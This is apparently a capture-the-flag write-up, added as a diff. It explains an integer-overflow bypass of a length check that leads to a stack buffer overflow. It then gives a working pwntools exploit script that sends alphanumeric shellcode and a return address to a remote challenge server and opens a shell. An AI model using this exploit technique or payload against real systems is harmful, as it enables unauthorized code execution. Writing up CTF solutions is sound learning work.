@@ -1,0 +1,37 @@
+This challenge was using an alphanumeric shellcode.
+
+The first challenge was that 
+it would first take length of name and and then that length for the buffer
+and still cannot be above 64. 
+the buffer size is 96 so it would never overflow on normal circumstances
+
+I noticed in read the buffer length is casted to ulong but it accepts integer
+
+so i tried integer overflow so it would be a negative number while checking num < 64 and during the buffer it would be a very big value
+
+The second challenge was that it can only have letters and numbers ..... at first i thought to bypass this check
+but there was shellcode that is alphanumeric 
+
+The information provided is the rbp as PIE is enabled (old rbp) so address of rbp - 96(size of buffer) gives the starting of the buffer
+
+from pwn import *
+
+p=remote('46.101.23.188',32537)
+
+p.recv()
+p.sendline(b'y')
+x=int(p.recvline().split()[-1].decode(),16)
+shell = b"XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V"
+payload =shell+ b"a"*(0x68 - len(shell)) +  p64(x-96)
+p.recv()
+p.sendline(b's')
+p.recv()
+p.sendline(b's')
+p.recv()
+num=b'1'*11
+p.sendline(num)
+p.recv()
+p.sendline(payload)
+p.interactive()
+
+
